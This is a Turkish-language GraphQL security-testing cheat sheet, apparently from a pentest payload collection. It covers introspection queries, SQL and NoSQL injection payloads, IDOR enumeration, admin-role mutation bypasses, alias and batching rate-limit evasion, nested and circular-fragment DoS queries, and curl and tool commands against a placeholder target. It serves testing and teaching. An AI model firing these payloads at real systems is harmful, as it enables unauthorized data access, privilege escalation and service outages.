# 📊 GraphQL Enjeksiyonu ve Güvenlik Testleri Kılavuzu

[🇬🇧 English](../GraphQL-Injection.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 GraphQL Temelleri

### Yaygın Uç Noktalar (Common Endpoints)
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### İstek Yapısı (Request Structure)
```graphql
# Sorgu (Query)
{
  user(id: 1) {
    name
    email
  }
}

# Operasyon adı ile sorgu
query GetUser {
  user(id: 1) {
    name
  }
}

# Veri Değiştirme (Mutation)
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 İç Gözlem (Introspection) Sorguları

### Tam Şema Çıkarma (Full Schema Introspection)
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Sorgu Tipleri ve Giriş Noktaları (Query Type)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Mutasyon Tipleri (Mutation Type)
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tüm Tipler (All Types)
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Belirli Bir Tipin Detayları (Specific Type Details)
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Enjeksiyon Saldırıları

### GraphQL Üzerinden SQL Enjeksiyonu (SQLi)
```graphql
# Argümanlar içerisinde
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Union tabanlı SQLi
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### NoSQL Enjeksiyonu
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Veya JSON gövdesi olarak
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (Güvensiz Doğrudan Nesne Başvurusu)
```graphql
# Diğer kullanıcıların verilerine ID değiştirerek erişim
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Tüm kullanıcıları topluca listeleme
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Yetkilendirme Atlatma (Authorization Bypass)

### Mutasyonlarda Eksik Yetki Kontrolü
```graphql
# Sıradan kullanıcı oturumu ile yönetici işlemlerini deneme
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### İlişkisel İç İçe Sorgu Atlatması (Nested Query Bypass)
```graphql
# Doğrudan engellenen hassas verilere ilişkisel modeller üzerinden erişim
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Alan Önerilerini Kötüye Kullanma (Field Suggestion Abuse)
```graphql
# GraphQL hata mesajlarında alan önerisi açıksa geçersiz alan girerek gizli alanları keşfetme
{
  user(id: 1) {
    passwor  # "Did you mean password?" şeklinde öneri döndürebilir
  }
}
```

---

## 🚀 Bilgi İfşası (Information Disclosure)

### Hata Ayıklama ve Hata Tabanlı Numaralandırma
```graphql
# Tip adı sorgusu
{
  __typename
}

# Stack trace tetiklemek için bilerek hatalı sorgu gönderme
{
  invalid_field_that_doesnt_exist
}
```

### Hassas Alan Keşfi
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Filtre ve Koruma Atlatma Teknikleri

### Takma Ad (Alias) ile İstek Limiti (Rate Limit) Atlatma
```graphql
# Tek bir HTTP isteğinde birden çok işlem çalıştırma
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Toplu İstek (Batching) Saldırıları
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Büyük/Küçük Harf Manipülasyonu
```graphql
# WAF veya filtreleri atlatmak için harf büyüklüklerini değiştirme
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Fragment Enjeksiyonu
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 DoS (Hizmet Engelleme) Saldırıları

### Derin İç İçe Döngü Saldırısı (Deep Query Attack)
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Dairesel Fragment Referansı (Circular Fragment)
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Dairesel referans / sonsuz döngü
}
```

### Aşırı Büyük Sonuç Kümesi İsteme
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Test Araçları

### GraphQL Voyager
```bash
# Şemayı görselleştirme aracı
https://graphql-kit.com/graphql-voyager/
# İç gözlem (introspection) çıktısını yapıştırın
```

### InQL (Burp Suite Eklentisi)
```
# Özellikler:
- Şema ayrıştırma
- Otomatik sorgu ve mutasyon üretimi
- Zafiyet taraması
```

### graphql-cop
```bash
# Güvenlik denetim aracı
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# GraphQL motoru parmak izi tespiti
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL İstemcisi
```
# Masaüstü test istemcisi
https://altairgraphql.dev/
```

---

## 📝 cURL Komut Örnekleri

### Temel Sorgu
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Değişkenler (Variables) ile Birlikte
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### İç Gözlem (Introspection) İsteği
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Kimlik Doğrulama Başlığı (Bearer Token) ile
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Test Kontrol Listesi (Checklist)

```markdown
□ GraphQL uç noktalarını tespit edin (/graphql, /api/graphql vb.)
□ Introspection (iç gözlem) özelliğini kontrol edin (__schema sorgusu)
□ Tüm query ve mutation operasyonlarını çıkartın
□ Nesne sorgularında IDOR zafiyetlerini test edin
□ Mutasyonlarda yetki denetimi eksikliklerini kontrol edin
□ Argümanlarda SQL / NoSQL enjeksiyonu arayın
□ İlişkisel modellerde hassas veri sızıntılarını araştırın
□ Alias ve batching ile rate limit atlatmayı deneyin
□ Gizli ve hassas alanları araştırın (password, token, apiKey)
□ Derinlik ve kaynak sınırlaması (DoS) testlerini yapın
□ Hata mesajlarında bilgi sızıntısı var mı kontrol edin
□ Subscription (WebSocket) uç noktalarını inceleyin
```

---

## 🔗 Yaygın Zafiyetler Özeti

| Zafiyet | Test Yöntemi | Etki |
|---------|--------------|------|
| **Introspection Açık** | `__schema` sorgusu gönderme | Şema ve tüm veri modellerinin ifşası |
| **IDOR** | Sorgulardaki kimlik numaralarını değiştirme | Başka kullanıcılara ait verilere izinsiz erişim |
| **Eksik Yetkilendirme** | Yetkisiz/farklı oturum ile mutasyon çalıştırma | Yetkisiz veri değiştirme veya silme |
| **SQLi / NoSQLi** | Parametre argümanlarına payload enjekte etme | Veritabanının ele geçirilmesi |
| **Aşırı Veri İfşası** | Hassas alanları sorgulama | Gizli anahtar ve parola sızıntısı |
| **DoS (Hizmet Dışı Bırakma)** | Derin veya dairesel sorgular gönderme | Sunucu kaynaklarının tükenmesi |
| **Batching / Alias Suistimali**| Çoklu istek paketleme | İstek limitlerinin (rate limiting) aşılması |

---

## 🔗 İlgili Kılavuzlar

- [SQLi Payload'ları](./SQLi.tr.md)
- [NoSQL Enjeksiyonu](./NoSQL-Injection.tr.md)
- [API Güvenliği](../../API-Security/translations/README.tr.md)

---

**Ana Dizine Dön:** [📖 Genel Kılavuz](../../README.tr.md)
